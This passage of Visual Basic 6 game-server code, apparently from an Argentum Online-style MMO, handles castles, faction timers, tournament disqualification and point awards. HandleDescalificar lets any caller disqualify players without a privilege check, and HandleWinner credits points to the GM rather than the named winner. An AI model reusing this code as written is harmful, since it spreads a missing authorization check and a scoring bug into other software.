        Call WriteConsoleMsg(UserIndex, "El castillo no le pertenece a tu faccion.", FontTypeNames.FONTTYPE_INFO)
    End If
    
    Exit Sub
errhandler:
    Call LogError("HandleGoCastle " & Err.description)
    Call Cerrar_Usuario(UserIndex)
End Sub
Public Sub HandleDescalificar(ByVal UserIndex As Integer)
    Dim Nombre As String
    Dim tIndex As Integer
    With UserList(UserIndex).incomingData
        .ReadByte
        Nombre = .ReadASCIIString
    End With
    
    tIndex = NameIndex(Nombre)
    
    If tIndex > 0 Then
        If Torneo = True Then
            If ColaTorneo.Existe(Nombre) Then
                ColaTorneo.Quitar (Nombre)
                Inscriptos = Inscriptos - 1
                Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg(UserList(tIndex).name & " ha sido descalificado del torneo.", FontTypeNames.FONTTYPE_GUILD))
            End If
        Else
            Call WriteConsoleMsg(UserIndex, "No hay ningun torneo en curso.", FontTypeNames.FONTTYPE_INFO)
        End If
    Else
        Call WriteConsoleMsg(UserIndex, "Usuario Offline.", FontTypeNames.FONTTYPE_INFO)
    End If
End Sub



Public Function EsCastillo(ByVal UserIndex As Integer) As Boolean
    Dim i As Byte
    
    EsCastillo = False
    For i = 1 To UBound(Castillo)
        If UserList(UserIndex).Pos.Map = Castillo(i).Map Then
            If UserList(UserIndex).Faccion.Alineacion <> Castillo(i).LeaderFaccion And Not UserList(UserIndex).Faccion.Alineacion = e_Alineacion.Neutro Then
                EsCastillo = True
                Exit Function
            End If
        End If
    Next i

End Function

Public Sub HandleWinner(ByVal UserIndex As Integer)
    Dim tName As String
    Dim puntos As Integer
    
    With UserList(UserIndex).incomingData
        .ReadByte
        tName = .ReadASCIIString
        puntos = .ReadInteger
    End With
    
    If Not UserList(UserIndex).flags.Privilegios >= 4 Then Exit Sub
    
    If puntos <= 5 Then
        If NameIndex(tName) > 0 Then
            Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("El participante " & tName & " ha ganado " & puntos & " puntos de torneo.", FontTypeNames.FONTTYPE_GUILD))
            UserList(UserIndex).Stats.puntos = UserList(UserIndex).Stats.puntos + puntos
            Call LogGM(UserList(UserIndex).name, " entrego " & puntos & " puntos.")
        Else
            Call WriteConsoleMsg(UserIndex, "El usuario esta offline.", FontTypeNames.FONTTYPE_INFO)
        End If
    Else
        Call WriteConsoleMsg(UserIndex, "No puedes entregar mas de 5 puntos.", FontTypeNames.FONTTYPE_INFO)
        Call LogGM(UserList(UserIndex).name, " intento entregar " & puntos & " puntos.")
    End If
End Sub

Public Function ClanPoseeMapa(ByVal GuildIndex As Integer, ByVal Map As Integer) As Boolean
    If GuildIndex > 0 Then
        If MapInfo(Map).PoseidoPor = GuildIndex Then
            ClanPoseeMapa = True
        End If
    End If
End Function

Public Sub CastleUnderAttack(ByVal CastleIndex As Byte)
    If Castillo(CastleIndex).UnderAttack Then
        Call SendData(SendTarget.toall, 0, PrepareMessageConsoleMsg("El Castillo " & Castillo(CastleIndex).name & " esta siendo atacado.", FontTypeNames.FONTTYPE_GUILD))
        Castillo(CastleIndex).UnderAttack = 0
    End If
End Sub

Public Sub ContadorFacciones()
    Dim i As Integer
    
    For i = 1 To LastUser
        If UserList(i).Faccion.SalioFaccion Then
            UserList(i).Faccion.SalioFaccionCounter = UserList(i).Faccion.SalioFaccionCounter - 1
            If UserList(i).Faccion.SalioFaccionCounter = 0 Then
                UserList(i).Faccion.SalioFaccion = 0
            End If
        End If
    Next i
End Sub

Public Function isAccountLogged(ByVal sAccName As String) As Boolean
    isAccountLogged = False
    Dim i As Integer
    
    For i = 1 To LastUser
        If UserList(i).UserAccount.name = sAccName Then
            isAccountLogged = True
            Exit Function
        End If
    Next i
End Function
